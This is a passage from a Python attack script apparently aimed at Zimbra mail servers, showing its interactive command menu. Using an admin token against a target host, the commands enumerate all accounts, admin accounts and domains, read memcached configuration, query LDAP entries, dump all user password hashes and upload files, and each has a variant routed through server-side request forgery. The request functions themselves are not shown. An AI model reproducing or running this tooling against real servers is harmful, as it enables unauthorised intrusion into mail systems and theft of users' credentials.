        elif cmd=='GetAllAccounts':
          getallaccounts_request(sys.argv[1],admin_token)
        elif cmd=='GetAllAdminAccounts':
          getalladminaccounts_request(sys.argv[1],admin_token)
        elif cmd=='GetMemcachedClientConfig':
          getmemcachedconfig_request(sys.argv[1],admin_token)
        elif cmd=='GetLDAPEntries':
          print("[*] Input the ldapSearchBase1:")
          print("Eg.")
          print("cn=*")
          ldapSearchBase1 = input("[>]:")
          print("[*] Input the ldapSearchBase2:")
          print("Eg.")
          print("dc=zimbra,dc=com")
          ldapSearchBase2 = input("[>]:")
          getldapentries_request(sys.argv[1],admin_token,ldapSearchBase1,ldapSearchBase2)
        elif cmd=='getalluserhash':
          print("[*] Input the ldapSearchBase:")
          print("Eg.")
          print("dc=zimbra,dc=com")
          ldapSearchBase = input("[>]:")          
          getalluserhash(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
        elif cmd=='GetToken':
          gettoken_request(sys.argv[1],admin_token)
        elif cmd=='upload':
          upload_request(sys.argv[1],admin_token)
        elif cmd=='GetAllDomainsSSRF':          
          getalldomains_requestSSRF(sys.argv[1],admin_token)
        elif cmd=='GetAllMailboxesSSRF':
          getallmailboxes_requestSSRF(sys.argv[1],admin_token)
        elif cmd=='GetAllAccountsSSRF':
          getallaccounts_requestSSRF(sys.argv[1],admin_token)
        elif cmd=='GetAllAdminAccountsSSRF':
          getalladminaccounts_requestSSRF(sys.argv[1],admin_token)
        elif cmd=='GetMemcachedClientConfigSSRF':
          getmemcachedconfig_requestSSRF(sys.argv[1],admin_token)
        elif cmd=='GetLDAPEntriesSSRF':
          print("[*] Input the ldapSearchBase1:")
          print("Eg.")
          print("cn=*")
          ldapSearchBase1 = input("[>]:")
          print("[*] Input the ldapSearchBase2:")
          print("Eg.")
          print("dc=zimbra,dc=com")
          ldapSearchBase2 = input("[>]:")
          getldapentries_requestSSRF(sys.argv[1],admin_token,ldapSearchBase1,ldapSearchBase2)
        elif cmd=='getalluserhashSSRF':
          print("[*] Input the ldapSearchBase:")
          print("Eg.")
          print("dc=zimbra,dc=com")
          ldapSearchBase = input("[>]:")          
          getalluserhashSSRF(sys.argv[1],admin_token,"cn=*",ldapSearchBase)
        elif cmd=='GetTokenSSRF':
          gettoken_requestSSRF(sys.argv[1],admin_token)
        elif cmd=='exit':
          exit(0)
        else:
          print("[!] Wrong parameter")

    else:
      print("[!] Wrong parameter")
